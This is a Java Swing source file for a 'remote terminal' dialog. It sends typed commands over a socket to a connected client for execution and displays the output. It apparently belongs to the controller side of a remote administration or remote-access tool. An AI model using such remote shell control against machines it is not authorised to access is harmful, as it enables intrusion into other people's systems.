package me.server.receive;

import com.sun.jna.platform.WindowUtils;
import me.server.Server;
import me.server.utils.MessageFlags;
import me.server.utils.SendMessage;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.IOException;
import java.io.InputStream;
import java.net.Socket;

public class RemoteCmd {
    InputStream icon = Server.class.getClassLoader().getResourceAsStream("me/resources/6.png");
    Image icons = ImageIO.read(icon);
    JTextArea jta;
    public RemoteCmd(Socket socket,String IP) throws IOException {
        JDialog frame1 = new JDialog();
        frame1.setIconImage(icons);
        jta=new JTextArea();
        jta.setEditable(false);
        jta.setBackground(Color.BLACK);
        jta.setForeground(Color.green);
        JScrollPane jsp=new JScrollPane(jta);
        JPanel jp=new JPanel();
        JTextField jtf=new JTextField(30);
        JButton jb=new JButton("发送");
        jb.setBackground(new Color(0, 250, 0));
        jp.add(jtf);
        jp.add(jb);
        Font font = new Font(Font.SERIF,Font.PLAIN,13);
        jta.setFont(font);
        jtf.setFont(font);
        frame1.add(jsp,BorderLayout.CENTER);
        frame1.add(jp,BorderLayout.SOUTH);
        frame1.setTitle("\\\\" + IP + "-" + "远程终端");
        frame1.setSize(800,550);
        frame1.setLocationRelativeTo(null);
        frame1.setVisible(true);
        jb.addActionListener((a)->{
            SendMessage.Send(MessageFlags.EXECUTE_REMOTE_CMD,jtf.getText().getBytes(),socket);
            jta.append(jtf.getText() + "\n");
            jtf.setText("");
        });
        frame1.addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent e) {
                SendMessage.SendHead(MessageFlags.CLOSE_REMOTE_CMD,socket);
            }
        });
    }
    public void update(byte[] bytes) {
        jta.append(new String(bytes));
    }
}
